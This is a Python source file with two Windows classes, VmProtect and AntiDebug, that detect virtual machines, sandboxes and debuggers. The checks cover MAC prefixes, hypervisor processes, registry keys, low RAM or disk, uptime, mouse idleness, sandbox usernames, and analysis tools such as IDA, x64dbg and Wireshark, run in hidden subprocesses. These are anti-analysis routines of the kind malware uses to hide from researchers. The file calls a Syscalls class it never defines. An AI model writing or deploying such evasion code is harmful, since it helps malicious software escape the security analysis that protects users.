import ctypes
import ctypes.wintypes
import logging
import os
import platform
import shutil
import subprocess
import time
import uuid
import winreg


class VmProtect:
    _logger = logging.getLogger('VmProtect')

    # MAC prefixes for known hypervisors
    _VM_MAC_PREFIXES = (
        '00:05:69',  # VMware
        '00:0c:29',  # VMware
        '00:1c:14',  # VMware
        '00:50:56',  # VMware
        '08:00:27',  # VirtualBox
        '00:03:ff',  # Hyper-V
        '00:15:5d',  # Hyper-V
    )

    _VM_PROCESSES = (
        'vmtoolsd.exe', 'vmwaretray.exe', 'VGAuthService.exe',
        'VBoxService.exe', 'VBoxTray.exe', 'vmsrvc.exe', 'vmusrvc.exe',
        'qemu-ga.exe', 'joeboxcontrol.exe', 'joeboxserver.exe',
        'xenservice.exe', 'prl_tools.exe',
    )

    _SANDBOX_USERNAMES = (
        'sandbox', 'virus', 'malware', 'test', 'john', 'user',
        'admin', 'currentuser', 'wdagutilityaccount',
    )

    @staticmethod
    def isVM() -> bool:
        """Run all VM/sandbox checks. Returns True if ANY detect a virtual environment."""
        checks = [
            VmProtect.checkMAC,
            VmProtect.checkProcesses,
            VmProtect.checkRegistry,
            VmProtect.checkDisk,
            VmProtect.checkMemory,
            VmProtect.checkCPU,
            VmProtect.checkResolution,
            VmProtect.checkUptime,
            VmProtect.checkMouseMovement,
            VmProtect.checkRecentFiles,
            VmProtect.checkUsername,
        ]
        for check in checks:
            try:
                if check():
                    VmProtect._logger.debug(f'VM detected by {check.__name__}')
                    return True
            except Exception as exc:
                VmProtect._logger.debug(f'{check.__name__} raised: {exc}')
        return False

    @staticmethod
    def checkMAC() -> bool:
        """Check if any NIC MAC address starts with known VM prefixes."""
        try:
            mac_hex = uuid.getnode()
            mac_str = ':'.join(f'{(mac_hex >> i) & 0xff:02x}' for i in range(40, -1, -8))
            mac_lower = mac_str.lower()
            for prefix in VmProtect._VM_MAC_PREFIXES:
                if mac_lower.startswith(prefix):
                    return True
            # Also check via getmac for multiple adapters
            result = subprocess.run(
                ['getmac', '/FO', 'CSV', '/NH'],
                capture_output=True, text=True, timeout=10,
                creationflags=0x08000000
            )
            for line in result.stdout.strip().splitlines():
                parts = line.replace('"', '').split(',')
                if parts:
                    raw_mac = parts[0].strip().lower().replace('-', ':')
                    for prefix in VmProtect._VM_MAC_PREFIXES:
                        if raw_mac.startswith(prefix):
                            return True
            return False
        except Exception:
            return False

    @staticmethod
    def checkProcesses() -> bool:
        """Check for VM-related processes in the current process list."""
        try:
            result = subprocess.run(
                ['tasklist', '/FO', 'CSV', '/NH'],
                capture_output=True, text=True, timeout=15,
                creationflags=0x08000000
            )
            running = result.stdout.lower()
            for proc in VmProtect._VM_PROCESSES:
                if proc.lower() in running:
                    return True
            return False
        except Exception:
            return False

    @staticmethod
    def checkRegistry() -> bool:
        """Check registry for VMware/VirtualBox/QEMU/Hyper-V signatures."""
        try:
            # VMware Tools
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\VMware, Inc.\VMware Tools')
                return True
            except FileNotFoundError:
                pass

            # VirtualBox Guest Additions
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Oracle\VirtualBox Guest Additions')
                return True
            except FileNotFoundError:
                pass

            # SystemBiosVersion check for VBOX / QEMU / BOCHS
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'HARDWARE\Description\System')
                bios_version, _ = winreg.QueryValueEx(key, 'SystemBiosVersion')
                winreg.CloseKey(key)
                bios_str = str(bios_version).lower()
                for sig in ('vbox', 'qemu', 'bochs', 'virtual'):
                    if sig in bios_str:
                        return True
            except (FileNotFoundError, OSError):
                pass

            # ACPI DSDT check for VBOX__
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'HARDWARE\ACPI\DSDT')
                for i in range(winreg.QueryInfoKey(key)[0]):
                    subkey_name = winreg.EnumKey(key, i)
                    if 'VBOX' in subkey_name.upper():
                        winreg.CloseKey(key)
                        return True
                winreg.CloseKey(key)
            except (FileNotFoundError, OSError):
                pass

            return False
        except Exception:
            return False

    @staticmethod
    def checkDisk() -> bool:
        """If total disk space < 60GB, likely a VM."""
        try:
            total, _, _ = shutil.disk_usage(os.environ.get('SystemDrive', 'C:') + '\\')
            return total < 60 * (1024 ** 3)
        except Exception:
            return False

    @staticmethod
    def checkMemory() -> bool:
        """If total RAM < 2GB, likely a VM."""
        try:
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ('dwLength', ctypes.c_ulong),
                    ('dwMemoryLoad', ctypes.c_ulong),
                    ('ullTotalPhys', ctypes.c_ulonglong),
                    ('ullAvailPhys', ctypes.c_ulonglong),
                    ('ullTotalPageFile', ctypes.c_ulonglong),
                    ('ullAvailPageFile', ctypes.c_ulonglong),
                    ('ullTotalVirtual', ctypes.c_ulonglong),
                    ('ullAvailVirtual', ctypes.c_ulonglong),
                    ('ullAvailExtendedVirtual', ctypes.c_ulonglong),
                ]

            mem = MEMORYSTATUSEX()
            mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
            return mem.ullTotalPhys < 2 * (1024 ** 3)
        except Exception:
            return False

    @staticmethod
    def checkCPU() -> bool:
        """If CPU core count < 2, likely a VM."""
        try:
            return (os.cpu_count() or 1) < 2
        except Exception:
            return False

    @staticmethod
    def checkResolution() -> bool:
        """If screen resolution is exactly 800x600 or 1024x768, likely a VM."""
        try:
            user32 = ctypes.windll.user32
            width = user32.GetSystemMetrics(0)  # SM_CXSCREEN
            height = user32.GetSystemMetrics(1)  # SM_CYSCREEN
            return (width, height) in ((800, 600), (1024, 768))
        except Exception:
            return False

    @staticmethod
    def checkUptime() -> bool:
        """If system uptime < 10 minutes, likely a freshly-spun sandbox."""
        try:
            uptime_ms = ctypes.windll.kernel32.GetTickCount64()
            uptime_minutes = uptime_ms / (1000 * 60)
            return uptime_minutes < 10
        except Exception:
            return False

    @staticmethod
    def checkMouseMovement() -> bool:
        """Record mouse position twice with 500ms gap. If identical, no human interaction."""
        try:
            class POINT(ctypes.Structure):
                _fields_ = [('x', ctypes.c_long), ('y', ctypes.c_long)]

            pt1 = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt1))
            time.sleep(0.5)
            pt2 = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))
            return pt1.x == pt2.x and pt1.y == pt2.y
        except Exception:
            return False

    @staticmethod
    def checkRecentFiles() -> bool:
        """If the Recent folder has < 10 items, likely a fresh sandbox."""
        try:
            recent_path = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Recent')
            if not os.path.isdir(recent_path):
                return True
            items = os.listdir(recent_path)
            return len(items) < 10
        except Exception:
            return False

    @staticmethod
    def checkUsername() -> bool:
        """Check if current username matches known sandbox usernames."""
        try:
            username = os.getlogin().lower().strip()
            return username in VmProtect._SANDBOX_USERNAMES
        except Exception:
            return False


class AntiDebug:
    _logger = logging.getLogger('AntiDebug')

    _DEBUGGER_PROCESSES = (
        'x64dbg.exe', 'x32dbg.exe', 'ollydbg.exe',
        'ida64.exe', 'ida.exe', 'idaq64.exe',
        'windbg.exe', 'processhacker.exe',
        'procmon.exe', 'procmon64.exe',
        'procexp.exe', 'procexp64.exe',
        'httpdebugger.exe', 'fiddler.exe', 'wireshark.exe',
        'dnspy.exe', 'cheatengine.exe',
    )

    @staticmethod
    def isDebugged() -> bool:
        """Run all debugger checks. Returns True if ANY detect a debugger."""
        checks = [
            AntiDebug.checkIsDebuggerPresent,
            AntiDebug.checkRemoteDebugger,
            AntiDebug.checkDebugPort,
            AntiDebug.timingCheck,
            AntiDebug.checkDebuggerProcesses,
        ]
        for check in checks:
            try:
                if check():
                    AntiDebug._logger.debug(f'Debugger detected by {check.__name__}')
                    return True
            except Exception as exc:
                AntiDebug._logger.debug(f'{check.__name__} raised: {exc}')
        return False

    @staticmethod
    def checkIsDebuggerPresent() -> bool:
        """Calls kernel32.IsDebuggerPresent via Syscalls."""
        try:
            return Syscalls.IsDebuggerPresent()
        except Exception:
            return False

    @staticmethod
    def checkRemoteDebugger() -> bool:
        """Calls CheckRemoteDebuggerPresent via ctypes."""
        try:
            is_debugged = ctypes.c_int(0)
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.c_void_p(-1),  # current process
                ctypes.byref(is_debugged)
            )
            return bool(is_debugged.value)
        except Exception:
            return False

    @staticmethod
    def checkDebugPort() -> bool:
        """Check ProcessDebugPort via NtQueryInformationProcess."""
        try:
            return Syscalls.NtQueryInformationProcess()
        except Exception:
            return False

    @staticmethod
    def timingCheck() -> bool:
        """Measure perf_counter around a busy loop. If > 2s for 10M iterations, debugger is attached."""
        try:
            start = time.perf_counter()
            total = 0
            for i in range(10_000_000):
                total += i
            elapsed = time.perf_counter() - start
            return elapsed > 2.0
        except Exception:
            return False

    @staticmethod
    def checkDebuggerProcesses() -> bool:
        """Check if any known debugger/analysis tools are running."""
        try:
            result = subprocess.run(
                ['tasklist', '/FO', 'CSV', '/NH'],
                capture_output=True, text=True, timeout=15,
                creationflags=0x08000000
            )
            running = result.stdout.lower()
            for proc in AntiDebug._DEBUGGER_PROCESSES:
                if proc.lower() in running:
                    return True
            return False
        except Exception:
            return False
